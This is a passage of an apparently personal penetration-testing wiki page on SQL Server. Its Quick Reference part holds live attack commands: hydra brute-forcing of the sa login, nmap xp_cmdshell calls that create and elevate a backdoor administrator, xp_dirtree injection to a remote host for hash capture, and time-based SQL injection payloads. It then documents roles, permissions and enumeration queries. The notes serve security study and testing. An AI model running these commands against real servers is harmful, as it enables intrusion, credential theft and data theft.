  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#defence" class="md-nav__link">
    Defence
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#references" class="md-nav__link">
    References
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                <h1 id="databases-sqlserver">Databases - SqlServer<a class="headerlink" href="#databases-sqlserver" title="Permanent link">&para;</a></h1>
<h2 id="quick-reference">Quick Reference<a class="headerlink" href="#quick-reference" title="Permanent link">&para;</a></h2>
<ul>
<li>mssql-sql-injection-cheat-sheet: <a href="http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet">http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet</a></li>
<li>SQL Server UNC Path Injection Cheatsheet: <a href="https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e">https://gist.github.com/nullbind/7dfca2a6309a4209b5aeef181b676c6e</a></li>
</ul>
<ul>
<li>Brute-forcing: <code class="codehilite"><span class="n">hydra</span> <span class="o">-</span><span class="n">l</span> <span class="n">sa</span> <span class="err">–</span><span class="n">P</span> <span class="o">/</span><span class="n">path</span><span class="o">/</span><span class="k">to</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span> <span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">10</span><span class="p">.</span><span class="mi">125</span> <span class="n">mssql</span></code></li>
<li>Nmap Enumeration:
    <div class="codehilite"><pre><span></span>nmap –script <span class="s2">&quot;ms-sql and not ms-sql-brute&quot;</span> <span class="s2">&quot;–script-args=mssql.username=sa,mssql.password=password,ms-sql-config.showall=true,ms-sql-tables.maxdb=0,ms-sql-tables.maxtables=0,ms-sql-xp-cmdshell.cmd=ipconfig /all&quot;</span> -d -oN mssql.nmap -Pn -v -sV –version-intensity <span class="m">9</span> -T2 -p T:27900,U:1434 <span class="m">10</span>.33.1.33

nmap -sV -T2 -Pn -n -sS –script<span class="o">=</span>ms-sql-xp-cmdshell.nse -p1433 –script-args mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>poiuytrewq,ms-sql-xp-cmdshell.cmd<span class="o">=</span><span class="s2">&quot;net user walter P@ssWORD1234 /add&quot;</span> <span class="m">10</span>.33.1.33

nmap -sV -T2 -Pn -n -sS –script<span class="o">=</span>ms-sql-xp-cmdshell.nse -p1433 –script-args mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>poiuytrewq,ms-sql-xp-cmdshell.cmd<span class="o">=</span><span class="s2">&quot;net localgroup administrators walter /add&quot;</span> <span class="m">10</span>.33.1.33

nmap -v -sV –version-intensity <span class="m">9</span> -T2 -p T:27900,U:1433 –script ms-sql-query –script-args mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>password,mssql.database<span class="o">=</span>bankdb,ms-sql-query.query<span class="o">=</span><span class="s2">&quot;SELECT * FROM tblCustomers&quot;</span> <span class="m">10</span>.33.1.33
</pre></div>
    <div class="codehilite"><pre><span></span>nmap -p <span class="m">1433</span> --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port<span class="o">=</span><span class="m">1433</span>,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER <span class="nv">$ip</span>
</pre></div></li>
<li>Capture hash: Run responder and do: <code class="codehilite"><span class="n">xp_dirtree</span> <span class="ss">&quot;\\10.10.14.8\test&quot;</span></code></li>
<li>List all databases
    <div class="codehilite"><pre><span></span><span class="k">EXEC</span> <span class="n">sp_databases</span><span class="p">;</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">sysobjects</span> <span class="k">where</span> <span class="n">xtype</span> <span class="o">=</span> <span class="s1">&#39;U&#39;</span><span class="p">;</span>
</pre></div></li>
<li>Connect from Linux: <code class="codehilite"><span class="n">sqsh</span> <span class="o">-</span><span class="n">S</span> <span class="n">someserver</span> <span class="o">-</span><span class="n">U</span> <span class="n">sa</span> <span class="o">-</span><span class="n">P</span> <span class="n">poiuytrewq</span> <span class="o">-</span><span class="n">D</span> <span class="n">bankdb</span></code></li>
<li>Special Schemas: <code class="codehilite"><span class="n">INFORMATION_SCHEMA</span></code> <code class="codehilite"><span class="n">sys</span></code></li>
<li>DB Structure:
    <div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">.</span><span class="n">dbo</span><span class="p">.</span><span class="n">sysdatabases</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">orcharddb</span><span class="p">.</span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">orcharddb</span><span class="p">.</span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">COLUMNS</span>
</pre></div></li>
<li>SQL Injection Tips:<ul>
<li>Commenting: <code class="codehilite"><span class="c1">--</span></code></li>
<li>Important functions<ul>
<li><code class="codehilite"><span class="n">xp_dirtree</span></code> - undocumented MSSQL stored procedure that allows for interaction with local and remote filesystems
<div class="codehilite"><pre><span></span><span class="s1">&#39;</span><span class="s">+EXEC+master.sys.xp_dirtree+</span><span class="s1">&#39;</span>\\<span class="mi">10</span>.<span class="mi">10</span>.<span class="mi">14</span>.<span class="mi">9</span>\<span class="nv">share</span><span class="o">--</span>
</pre></div></li>
</ul>
</li>
<li>Time based injection
  <div class="codehilite"><pre><span></span><span class="s1">&#39;</span><span class="s"> if (select user) = </span><span class="s1">&#39;</span><span class="nv">sa</span><span class="s1">&#39;</span><span class="s"> waitfor delay </span><span class="s1">&#39;</span><span class="mi">0</span>:<span class="mi">0</span>:<span class="mi">5</span><span class="s1">&#39;</span><span class="s">--</span>
<span class="s1">&#39;</span><span class="s"> if (select user) != </span><span class="s1">&#39;</span><span class="nv">sa</span><span class="s1">&#39;</span><span class="s"> waitfor delay </span><span class="s1">&#39;</span><span class="mi">0</span>:<span class="mi">0</span>:<span class="mi">5</span><span class="s1">&#39;</span><span class="s">--</span>
</pre></div></li>
</ul>
</li>
</ul>
<h2 id="tools">Tools<a class="headerlink" href="#tools" title="Permanent link">&para;</a></h2>
<ul>
<li>SQSH<ul>
<li><a href="https://www.adampalmer.me/iodigitalsec/2013/08/10/accessing-and-hacking-mssql-from-backtrack-linux/">Accessing and Hacking MSSQL from Backtrack Linux</a></li>
<li>Installation:
  <div class="codehilite"><pre><span></span><span class="n">apt</span><span class="o">-</span><span class="k">get</span> <span class="n">install</span> <span class="n">sqsh</span> <span class="n">freetds</span><span class="o">-</span><span class="n">bin</span> <span class="n">freetds</span><span class="o">-</span><span class="n">common</span> <span class="n">freetds</span><span class="o">-</span><span class="n">dev</span>
</pre></div><ul>
<li>Edit <code class="codehilite"><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">freetds</span><span class="o">/</span><span class="n">freetds</span><span class="p">.</span><span class="n">conf</span></code>, and append:
  <div class="codehilite"><pre><span></span><span class="k">[MyServer]</span>
<span class="na">host</span> <span class="o">=</span> <span class="s">192.168.1.10</span>
<span class="na">port</span> <span class="o">=</span> <span class="s">1433</span>
<span class="na">tds version</span> <span class="o">=</span> <span class="s">8.0</span>
</pre></div></li>
<li>Optionally edit <code class="codehilite"><span class="o">~/</span><span class="p">.</span><span class="n">sqshrc</span></code>:
  <div class="codehilite"><pre><span></span><span class="err">\</span><span class="k">set</span> <span class="n">username</span><span class="o">=</span><span class="n">sa</span>
<span class="err">\</span><span class="k">set</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span>
<span class="err">\</span><span class="k">set</span> <span class="n">style</span><span class="o">=</span><span class="n">vert</span>
</pre></div></li>
</ul>
</li>
<li>Run:
  <div class="codehilite"><pre><span></span><span class="n">sqsh</span> <span class="o">-</span><span class="n">S</span> <span class="n">MyServer</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="n">sqsh</span> <span class="o">-</span><span class="n">S</span> <span class="err">{</span><span class="k">system</span> <span class="n">name</span><span class="o">/</span><span class="n">IP</span><span class="err">}</span><span class="p">:</span><span class="err">{</span><span class="n">port</span> <span class="n">num</span><span class="err">}</span> <span class="o">-</span><span class="n">U</span> <span class="err">{</span><span class="n">username</span><span class="err">}</span> <span class="o">-</span><span class="n">P</span> <span class="err">{</span><span class="n">password</span><span class="err">}</span>
</pre></div></li>
<li>List of available databases with:
  <div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">..</span><span class="n">sysdatabases</span>
<span class="k">go</span>
</pre></div></li>
<li>Build from source:
  <div class="codehilite"><pre><span></span><span class="nv">$export</span> <span class="nv">SYBASE</span><span class="o">=</span>/usr/local/freetds
$ ./configure
$ make
$ su
<span class="c1"># make install</span>
<span class="c1"># ls -l /usr/local/bin/sqsh</span>
<span class="c1"># ls -l /usr/local/bin/sqsh.bin</span>
</pre></div></li>
</ul>
</li>
</ul>
<h2 id="roles-and-permissions">Roles and Permissions<a class="headerlink" href="#roles-and-permissions" title="Permanent link">&para;</a></h2>
<h3 id="principals">Principals<a class="headerlink" href="#principals" title="Permanent link">&para;</a></h3>
<p>Principals are entities that can request SQL Server resources.</p>
<p><em>SQL Server-level principals:</em></p>
<ul>
<li>SQL Server authentication Login<ul>
<li>sa<ul>
<li>Created when instance is installed</li>
<li>Default database is <code class="codehilite"><span class="n">master</span></code></li>
<li>Member of <code class="codehilite"><span class="n">sysadmin</span></code> database role</li>
</ul>
</li>
<li>public<ul>
<li>Every login belongs to the this role</li>
</ul>
</li>
</ul>
</li>
<li>Windows authentication login for a Windows user</li>
<li>Windows authentication login for a Windows group</li>
<li>Azure Active Directory authentication login for a AD user</li>
<li>Azure Active Directory authentication login for a AD group</li>
<li>Server Role</li>
</ul>
<p><em>Database-level principals:</em></p>
<ul>
<li>Database User (There are 11 types of users. For more information, see CREATE USER.)<ul>
<li>dbo<ul>
<li>Created for each database</li>
<li>Has all permissions in the database</li>
<li>Owns <code class="codehilite"><span class="n">dbo</span></code> schema (<code class="codehilite"><span class="n">dbo</span></code> schema is the default schema for all users, and cannot be dropped)</li>
</ul>
</li>
<li>guest<ul>
<li>Permissions granted are inherited by users who have access to the database, but who do not have a user account in the database.</li>
<li>Cannot be dropped</li>
<li>Can be disabled by revoking it's CONNECT permission (<code class="codehilite"><span class="nv">REVOKE</span> <span class="k">CONNECT</span> <span class="nv">FROM</span> <span class="nv">GUEST</span><span class="c1">;</span></code>)</li>
</ul>
</li>
</ul>
</li>
<li>Database Role</li>
<li>Application Role</li>
</ul>
<h3 id="server-level-roles-and-permissions">Server-Level Roles and Permissions<a class="headerlink" href="#server-level-roles-and-permissions" title="Permanent link">&para;</a></h3>
<p><strong>Fixed Roles</strong></p>
<ul>
<li><code class="codehilite"><span class="n">sysadmin</span></code> - Can perform any activity in the server.</li>
<li><code class="codehilite"><span class="n">serveradmin</span></code> - Can change server-wide configuration options and shut down the server.</li>
<li><code class="codehilite"><span class="n">securityadmin</span></code><ul>
<li>Manage logins and their properties.</li>
<li>Can GRANT, DENY, and REVOKE server-level permissions.</li>
<li>Can also GRANT, DENY, and REVOKE database-level permissions if they have access to a database.</li>
<li>Can reset passwords for SQL Server logins.</li>
<li>Should be treated as equivalent to the sysadmin role.</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">processadmin</span></code> - Can end processes that are running in an instance of SQL Server.</li>
<li><code class="codehilite"><span class="n">setupadmin</span></code> - Can add and remove linked servers by using Transact-SQL statements (sysadmin membership is needed when using Management Studio.)</li>
<li><code class="codehilite"><span class="n">bulkadmin</span></code> - Can run the BULK INSERT statement. </li>
<li><code class="codehilite"><span class="n">diskadmin</span></code> - Used for managing disk files.</li>
<li><code class="codehilite"><span class="n">dbcreator</span></code> - Can create, alter, drop, and restore any database.</li>
<li><code class="codehilite"><span class="k">public</span></code><ul>
<li>Every SQL Server login belongs to the public server role.</li>
<li>When a server principal has not been granted or denied specific permissions on a securable object, the user inherits the permissions granted to public on that object.</li>
<li>Only assign public permissions on any object when you want the object to be available to all users.</li>
<li>You cannot change membership in public.</li>
<li>Public is implemented differently than other roles, and permissions can be granted, denied, or revoked from the public fixed server roles.</li>
</ul>
</li>
</ul>
<p><strong>Fixed Roles and Permissions</strong></p>
<p><img alt="Server level roles and permissions" src="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-server-roles.png?view=sql-server-2017" /></p>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017</a></p>
</blockquote>
<p><strong>Working with Server-Level Roles</strong></p>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017#working-with-server-level-roles">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/server-level-roles?view=sql-server-2017#working-with-server-level-roles</a></p>
</blockquote>
<h3 id="database-level-roles-and-permissions">Database Level Roles and Permissions<a class="headerlink" href="#database-level-roles-and-permissions" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="k">CREATE</span> <span class="n">LOGIN</span> <span class="p">...</span> <span class="k">WITH</span> <span class="n">PASSWORD</span> <span class="o">=</span> <span class="p">...;</span>
</pre></div>

<p><strong>Fixed Roles</strong></p>
<ul>
<li><code class="codehilite"><span class="n">db_owner</span></code><ul>
<li>Can perform all configuration and maintenance activities on the database.</li>
<li>Can drop the database in SQL Server.</li>
<li>(In SQL Database and SQL Data Warehouse, some maintenance activities require server-level permissions and cannot be performed by db_owners)</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">db_securityadmin</span></code><ul>
<li>Can modify role membership and manage permissions.</li>
<li>Adding principals to this role could enable unintended privilege escalation.</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">db_accessadmin</span></code><ul>
<li>Can add or remove access to the database for Windows logins, Windows groups, and SQL Server logins.</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">db_backupoperator</span></code> - Can back up the database. </li>
<li><code class="codehilite"><span class="n">db_ddladmin</span></code> - Can run any Data Definition Language (DDL) command. </li>
<li><code class="codehilite"><span class="n">db_datawriter</span></code> - Can add, delete, or change data in all user tables. </li>
<li><code class="codehilite"><span class="n">db_datareader</span></code> - Can read all data from all user tables. </li>
<li><code class="codehilite"><span class="n">db_denydatawriter</span></code> - Cannot add, modify, or delete any data in the user tables within a database. </li>
<li><code class="codehilite"><span class="n">db_denydatareader</span></code> - Cannot read any data in the user tables within a database. </li>
</ul>
<p><strong>Fixed Roles and Permissions</strong></p>
<p><img alt="Database level roles and permissions" src="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017" /></p>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/media/permissions-of-database-roles.png?view=sql-server-2017</a></p>
</blockquote>
<p><strong>Special Roles for SQL Database and SQL Data Warehouse</strong></p>
<ul>
<li>Exist only in the virtual master database.</li>
<li>Permissions are restricted to actions performed in master.</li>
</ul>
<ul>
<li>Only database users in master can be added to these roles.</li>
<li>Logins cannot be added to these roles, but users can be created based on logins and then those users can be added to the roles. Contained database users in master, can also be added to these roles.</li>
</ul>
<ul>
<li><code class="codehilite"><span class="n">dbmanager</span></code><ul>
<li>Can create and delete databases.</li>
<li>A member of the dbmanager role that creates a database, becomes the owner of that databasee which allows that user to connect to that database as the dbo user.</li>
<li>The dbo user has all database permissions in the database.</li>
<li>Members of the dbmanager role do not necessarily have permission to access databases that they do not own.</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">loginmanager</span></code> - Can create and delete logins in the virtual master database.</li>
</ul>
<p><strong>Special Roles for msdb Database</strong></p>
<ul>
<li><code class="codehilite"><span class="n">db_ssisadmin</span></code> <code class="codehilite"><span class="n">db_ssisoperator</span></code> <code class="codehilite"><span class="n">db_ssisltduser</span></code><ul>
<li>Can administer and use SSIS.</li>
<li>Instances of SQL Server that are upgraded from an earlier version might contain an older version of the role that was named using Data Transformation Services (DTS) instead of SSIS.</li>
<li><code class="codehilite"><span class="n">db_ssisadmin</span></code> - may be able to elevate their privileges to <code class="codehilite"><span class="n">sysadmin</span></code> [1]</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">dc_admin</span></code> <code class="codehilite"><span class="n">dc_operator</span></code> <code class="codehilite"><span class="n">dc_proxy</span></code> - Can administer and use the data collector.<ul>
<li><code class="codehilite"><span class="n">dc_admin</span></code> may be able to elevate their privileges to <code class="codehilite"><span class="n">sysadmin</span></code>. [1]</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">PolicyAdministratorRole</span></code><ul>
<li>Can perform all configuration and maintenance activities on Policy-Based Management policies and conditions.</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">ServerGroupAdministratorRole</span></code> <code class="codehilite"><span class="n">ServerGroupReaderRole</span></code> - Can administer and use registered server groups.</li>
<li><code class="codehilite"><span class="n">dbm_monitor</span></code> <ul>
<li>Created in the <code class="codehilite"><span class="n">msdb</span></code> database when the first database is registered in <code class="codehilite"><span class="k">Database</span> <span class="n">Mirroring</span> <span class="n">Monitor</span></code>.</li>
<li>Has no members until a system administrator assigns users to the role.</li>
</ul>
</li>
</ul>
<p>[1] These roles can modify <code class="codehilite"><span class="n">Integration</span> <span class="n">Services</span></code> packages and <code class="codehilite"><span class="n">Integration</span> <span class="n">Services</span></code> packages can be executed by <code class="codehilite"><span class="k">SQL</span> <span class="n">Server</span></code> using the <code class="codehilite"><span class="n">sysadmin</span></code> security context of SQL Server Agent. To guard against this elevation of privilege when running maintenance plans, data collection sets, and other Integration Services packages, configure SQL Server Agent jobs that run packages to use a proxy account with limited privileges or only add <code class="codehilite"><span class="n">sysadmin</span></code> members to the <code class="codehilite"><span class="n">db_ssisadmin</span></code> and <code class="codehilite"><span class="n">dc_admin</span></code> roles.</p>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#msdb-roles">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#msdb-roles</a></p>
</blockquote>
<p><strong>Special Roles for R Services</strong></p>
<ul>
<li><code class="codehilite"><span class="n">rpkgs</span><span class="o">-</span><span class="n">users</span></code> - Allows using any shared packages that were installed by members of the rpkgs-shared role.</li>
<li><code class="codehilite"><span class="n">rpkgs</span><span class="o">-</span><span class="n">private</span></code><ul>
<li>Provides access to shared packages with the same permissions as the rpkgs-users role.</li>
<li>Members of this role can also install, remove and use privately scoped packages.</li>
</ul>
</li>
<li><code class="codehilite"><span class="n">rpkgs</span><span class="o">-</span><span class="n">shared</span></code> <ul>
<li>Provides the same permissions as the rpkgs-private role.</li>
<li>Users who are members of this role can also install or remove shared packages.</li>
</ul>
</li>
</ul>
<p><strong>Working with Database-Level Roles</strong></p>
<blockquote>
<p><a href="https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#working-with-database-level-roles">https://docs.microsoft.com/en-us/sql/relational-databases/security/authentication-access/database-level-roles?view=sql-server-2017#working-with-database-level-roles</a></p>
</blockquote>
<h3 id="application-roles">Application Roles<a class="headerlink" href="#application-roles" title="Permanent link">&para;</a></h3>
<ul>
<li>Enable access to specific data to only those users who connect through a particular application.</li>
<li>Enabled by using <code class="codehilite"><span class="n">sp_setapprole</span></code></li>
</ul>
<h2 id="enumeration">Enumeration<a class="headerlink" href="#enumeration" title="Permanent link">&para;</a></h2>
<ul>
<li>Direct Access<ul>
<li>SQLPS module</li>
<li>SQL Server Management Modules (SMO)</li>
<li>.NET (System.Data.SQL / System.Data.SQLClient)</li>
</ul>
</li>
<li>Modules<ul>
<li>PowerUpSQL - Toolkit for Attacking SQL Server: <a href="https://github.com/NetSPI/PowerUpSQL">https://github.com/NetSPI/PowerUpSQL</a></li>
</ul>
</li>
<li>Discovery<ul>
<li>PowerUpSQL: <code class="codehilite"><span class="k">Get</span><span class="o">-</span><span class="n">SQLInstanceScanUDP</span> <span class="o">-</span><span class="n">ComputerName</span> <span class="mi">192</span><span class="p">.</span><span class="mi">168</span><span class="p">.</span><span class="mi">1</span><span class="p">.</span><span class="mi">2</span> <span class="o">-</span><span class="k">verbose</span></code></li>
<li>.NET (UDP Broadcast): <code class="codehilite"><span class="p">[</span><span class="k">System</span><span class="p">.</span><span class="k">Data</span><span class="p">.</span><span class="k">Sql</span><span class="p">.</span><span class="n">SqlDataSourceEnumeration</span><span class="p">]::</span><span class="n">Instance</span><span class="p">.</span><span class="n">GetDataSources</span><span class="p">()</span></code></li>
</ul>
</li>
<li>Local Enumeration<ul>
<li><a href="http://www.powershellmagazine.com/2014/07/21/using-powershell-to-discover-information-about-your-microsoft-sql-servers/">http://www.powershellmagazine.com/2014/07/21/using-powershell-to-discover-information-about-your-microsoft-sql-servers/</a>
  <div class="codehilite"><pre><span></span><span class="nb">Import-Module</span> <span class="n">-Name</span> <span class="n">SQLPS</span>
<span class="nb">Get-ChildItem</span> <span class="n">SQLSERVER</span><span class="err">:</span><span class="p">\</span><span class="n">SQL</span><span class="p">\&lt;</span><span class="n">machinename</span><span class="p">&gt;</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="nb">Get-Service</span> <span class="n">-Name</span> <span class="n">MSSQL</span><span class="p">*</span>
<span class="n">sqlinstances</span> <span class="p">=</span> <span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s1">&#39;HKLM:\SOFTWARE\Microsoft\Microsoft SQL Server&#39;</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$SQLInstance</span> <span class="k">in</span> <span class="nv">$SQLInstances</span><span class="p">)</span> <span class="p">{</span> <span class="k">foreach</span> <span class="p">(</span><span class="nv">$s</span> <span class="k">in</span> <span class="nv">$SQLInstance</span><span class="p">.</span><span class="n">InstalledInstances</span><span class="p">)</span> <span class="p">{</span> <span class="no">[PSCustomObject]</span><span class="p">@{</span> <span class="n">PSComputerName</span> <span class="p">=</span> <span class="nv">$SQLInstance</span><span class="p">.</span><span class="n">PSComputerName</span> <span class="n">InstanceName</span> <span class="p">=</span> <span class="nv">$s</span><span class="p">}}}</span>
</pre></div>
  <div class="codehilite"><pre><span></span><span class="nb">Get-SQLInstanceLocal</span>
</pre></div></li>
</ul>
</li>
<li>Domain Enumeration<ul>
<li>Search AD user attribute: <code class="codehilite"><span class="n">servicePrincipalName</span><span class="o">=</span><span class="n">MSSQL</span><span class="o">*</span></code>
  <div class="codehilite"><pre><span></span><span class="nb">Import-Module</span> <span class="n">-Name</span> <span class="n">PowerUpSQL</span>
<span class="nb">Get-SQLInstanceDomain</span> <span class="n">-verbose</span>
</pre></div></li>
</ul>
</li>
<li>Looking for interesting databases
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLDatabaseThreaded</span> <span class="n">-Threads</span> <span class="n">10</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-verbose</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-ExpandProperty</span> <span class="n">DatabaseName</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLDatabaseThreaded</span> <span class="n">-Threads</span> <span class="n">10</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="p">|</span> <span class="nb">Where-Object</span> <span class="p">{</span><span class="nv">$_</span><span class="p">.</span><span class="n">is_encrypted</span> <span class="o">-eq</span> <span class="err">“</span><span class="n">True</span><span class="s2">&quot;}</span>
</pre></div>
    <div class="codehilite"><pre><span></span><span class="nb">Get-SQLColumnSampleDataThreaded</span> <span class="n">-Threads</span> <span class="n">10</span> <span class="n">-Keywords</span> <span class="s2">&quot;password, credit&quot;</span> <span class="n">-SampleSize</span> <span class="n">5</span> <span class="n">-ValidateCC</span> <span class="n">-NoDefaults</span> <span class="n">-Username</span> <span class="n">sa</span> <span class="n">-Password</span> <span class="n">pw</span> <span class="n">-Instance</span> <span class="n">instance</span> <span class="n">-Verbose</span>
</pre></div></li>
</ul>
<h3 id="queries">Queries<a class="headerlink" href="#queries" title="Permanent link">&para;</a></h3>
<ul>
<li>Version: <code class="codehilite"><span class="k">SELECT</span><span class="w"> </span><span class="nb">@@version</span><span class="w"></span></code></li>
<li>Current User: <code class="codehilite"><span class="k">SELECT</span> <span class="n">SUSER_SNAME</span><span class="p">()</span></code> <code class="codehilite"><span class="k">SELECT</span> <span class="k">SYSTEM_USER</span></code></li>
<li>Current Role: <code class="codehilite"><span class="k">SELECT</span> <span class="n">IS_SRVROLEMEMBER</span><span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">)</span></code> <code class="codehilite"><span class="k">SELECT</span> <span class="k">user</span></code></li>
<li>Current Database: <code class="codehilite"><span class="k">SELECT</span> <span class="n">db_name</span><span class="p">()</span></code></li>
<li>List All Databases: <code class="codehilite"><span class="k">SELECT</span> <span class="n">name</span> <span class="k">FROM</span> <span class="n">master</span><span class="p">..</span><span class="n">sysdatabases</span></code></li>
<li>List All Logins: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="k">WHERE</span> <span class="n">type_desc</span> <span class="o">!=</span> <span class="s1">&#39;SERVER_ROLE&#39;</span></code></li>
<li>List All Users for Database: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="k">WHERE</span> <span class="n">type_desc</span> <span class="o">!=</span> <span class="s1">&#39;DATABASE_ROLE&#39;</span></code></li>
<li>List All Sysadmins: <code class="codehilite"><span class="k">SELECT</span> <span class="n">name</span><span class="p">,</span><span class="n">type_desc</span><span class="p">,</span><span class="n">is_disabled</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">server_principals</span> <span class="k">WHERE</span> <span class="n">IS_SRVROLEMEMBER</span> <span class="p">(</span><span class="s1">&#39;sysadmin&#39;</span><span class="p">,</span><span class="n">name</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span></code></li>
<li>List All Roles: 
    <div class="codehilite"><pre><span></span><span class="k">SELECT</span> <span class="n">DP1</span><span class="p">.</span><span class="n">name</span> <span class="k">AS</span> <span class="n">DatabaseRoleName</span><span class="p">,</span> <span class="k">isnull</span> <span class="p">(</span><span class="n">DP2</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="s1">&#39;No members&#39;</span><span class="p">)</span> <span class="k">AS</span> <span class="n">DatabaseUserName</span>
<span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_role_members</span> <span class="k">AS</span> <span class="n">DRM</span>
<span class="k">RIGHT</span> <span class="k">OUTER</span> <span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="k">AS</span> <span class="n">DP1</span> <span class="k">ON</span> <span class="n">DRM</span><span class="p">.</span><span class="n">role_principal_id</span> <span class="o">=</span> <span class="n">DP1</span><span class="p">.</span><span class="n">principal_id</span>
<span class="k">LEFT</span> <span class="k">OUTER</span> <span class="k">JOIN</span> <span class="n">sys</span><span class="p">.</span><span class="n">database_principals</span> <span class="k">AS</span> <span class="n">DP2</span> <span class="k">ON</span> <span class="n">DRM</span><span class="p">.</span><span class="n">member_principal_id</span> <span class="o">=</span> <span class="n">DP2</span><span class="p">.</span><span class="n">principal_id</span>
<span class="k">WHERE</span> <span class="n">DP1</span><span class="p">.</span><span class="k">type</span> <span class="o">=</span> <span class="s1">&#39;R&#39;</span> <span class="k">ORDER</span> <span class="k">BY</span> <span class="n">DP1</span><span class="p">.</span><span class="n">name</span><span class="p">;</span>
</pre></div></li>
<li>Effective Permissions for Server: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">fn_my_permissions</span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span> <span class="s1">&#39;SERVER&#39;</span><span class="p">);</span></code></li>
<li>Effective Permissions for Database: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">fn_my_permissions</span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span> <span class="s1">&#39;DATABASE&#39;</span><span class="p">);</span></code></li>
<li>Active User Tokens: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">user_token</span></code></li>
<li>Active Login Tokens: <code class="codehilite"><span class="k">SELECT</span> <span class="o">-</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">login_token</span></code></li>
<li>Impersonatable Accounts:
